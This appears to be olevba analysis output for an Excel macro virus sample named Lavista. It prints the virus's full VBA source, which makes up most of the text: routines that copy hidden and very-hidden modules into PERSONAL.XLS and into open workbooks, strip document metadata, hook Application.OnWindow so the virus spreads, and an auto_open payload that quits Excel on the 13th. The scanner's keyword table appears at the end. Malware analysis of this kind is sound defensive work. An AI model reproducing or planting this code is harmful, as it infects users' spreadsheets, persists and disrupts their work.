olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Lavista-97fb5a79e9797f5e15c53eb6907aa36b8b350f64
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ape.bas 
in file: Virus.MSExcel.Lavista-97fb5a79e9797f5e15c53eb6907aa36b8b350f64 - OLE stream: '_VBA_PROJECT_CUR/VBA/ape'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Dim no As Integer
Dim off As Integer
Dim find_mod As Integer
Dim find_mod_per As Integer
Dim exist_per As Integer

Sub test_aktiv_book()
Attribute test_aktiv_book.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    On Error GoTo defect
    no = 1
    find_mod = 0
    off = 0
    Do While off = 0
        If ActiveWorkbook.Modules(no).Name = "ape" Then
            off = 1
            find_mod = 1
        Else
            no = no + 1
        End If
    Loop
    Exit Sub
defect:
    find_mod = 0
End Sub
Sub test_personal()
Attribute test_personal.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    If UCase(Dir(Application.StartupPath & "\" & "PERSONAL.XLS)) = "PERSONAL.XLS" Then
        exist_per = 4
    Else
        exist_per = 0
    End If
    If exist_per = 4 Then
        On Error GoTo defect
        no = 1
        find_mod_per = 0
        off = 0
        Do While off = 0
            If Workbooks("PERSONAL.XLS").Modules(no).Name = "ape" Then
                off = 1
                find_mod_per = 2
            Else
                no = no + 1
            End If
        Loop
        Exit Sub
defect:
        find_mod_per = 0
    Else
        find_mod_per = 0
    End If
End Sub
Sub create_modul()
Attribute create_modul.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    On Error GoTo defect
    Application.DisplayAlerts = False
    Application.Run ("test_aktiv_book")
    Application.Run ("test_personal")
    path_book = ActiveWorkbook.Path
    name_book = ActiveWorkbook.Name
    name_sheet = ActiveSheet.Name
    If exist_per + find_mod + find_mod_per = 6 Then
        Windows("PERSONAL.XLS").Visible = True
        Sheets("ape").Visible = True
        Sheets("monkey").Visible = True
        Workbooks("PERSONAL.XLS").Sheets("ape").Copy before:=Workbooks(name_book).Sheets(1)
        Workbooks("PERSONAL.XLS").Sheets("monkey").Copy before:=Workbooks(name_book).Sheets(1)
        Workbooks(name_book).Sheets("ape").Visible = False
        Workbooks(name_book).Sheets("monkey").Visible = xlVeryHidden
        Workbooks("PERSONAL.XLS").Sheets("ape").Visible = False
        Workbooks("PERSONAL.XLS").Sheets("monkey").Visible = xlVeryHidden
        Windows("PERSONAL.XLS").Visible = False
        Workbooks("PERSONAL.XLS").Save
        Workbooks(name_book).Sheets(name_sheet).Activate
        If ActiveWorkbook.Path <> "" Then
            Workbooks(name_book).Save
        End If
    ElseIf exist_per + find_mod + find_mod_per = 5 Then
        Windows("PERSONAL.XLS").Visible = True
        Workbooks(name_book).Sheets("ape").Visible = True
        Workbooks(name_book).Sheets("monkey").Visible = True
        Workbooks(name_book).Sheets("ape").Copy before:=Workbooks("PERSONAL.XLS").Sheets(1)
        Workbooks(name_book).Sheets("monkey").Copy before:=Workbooks("PERSONAL.XLS").Sheets(1)
        Workbooks(name_book).Sheets("ape").Visible = False
        Workbooks(name_book).Sheets("monkey").Visible = xlVeryHidden
        Workbooks("PERSONAL.XLS").Sheets("ape").Visible = False
        Workbooks("PERSONAL.XLS").Sheets("monkey").Visible = xlVeryHidden
        Windows("PERSONAL.XLS").Visible = False
        Workbooks("PERSONAL.XLS").Save
        Workbooks(name_book).Sheets(name_sheet).Activate
        Application.OnWindow = ""
        Application.OnWindow = "PERSONAL.XLS!create_modul"
    ElseIf exist_per + find_mod + find_mod_per = 1 Then
        Workbooks(name_book).Modules.Add
        new_module = ActiveSheet.Name
        ActiveSheet.Select
        ActiveSheet.Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        new_book = ActiveWorkbook.Name
        ActiveWindow.Visible = False
        Workbooks(new_book).SaveAs Filename:=Application.StartupPath & "\" & "PERSONAL.XLS"
        Windows("PERSONAL.XLS").Visible = True
        Workbooks(name_book).Sheets("ape").Visible = True
        Workbooks(name_book).Sheets("monkey").Visible = True
        Workbooks(name_book).Sheets("ape").Copy before:=Workbooks("PERSONAL.XLS").Sheets(1)
        Workbooks(name_book).Sheets("monkey").Copy before:=Workbooks("PERSONAL.XLS").Sheets(1)
        Workbooks(name_book).Sheets("ape").Visible = False
        Workbooks(name_book).Sheets("monkey").Visible = xlVeryHidden
        Workbooks("PERSONAL.XLS").Sheets("ape").Visible = False
        Workbooks("PERSONAL.XLS").Sheets("monkey").Visible = xlVeryHidden
        Windows("PERSONAL.XLS").Visible = False
        Workbooks("PERSONAL.XLS").Save
        Sheets(new_module).Delete
        Workbooks(name_book).Sheets(name_sheet).Activate
        Application.OnWindow = ""
        Application.OnWindow = "PERSONAL.XLS!create_modul"
    End If
    Application.ScreenUpdating = True
defect:
End Sub
    


-------------------------------------------------------------------------------
VBA MACRO monkey.bas 
in file: Virus.MSExcel.Lavista-97fb5a79e9797f5e15c53eb6907aa36b8b350f64 - OLE stream: '_VBA_PROJECT_CUR/VBA/monkey'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    On Error GoTo defecta
    If Day(Date) = 13 Then
        MsgBox "Hasta la vista, baby!"
        Application.Quit
    End If
    Application.OnWindow = "create_modul"
Exit Sub
defecta:
    Application.OnWindow = ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, very hidden -  monke
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  ap
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

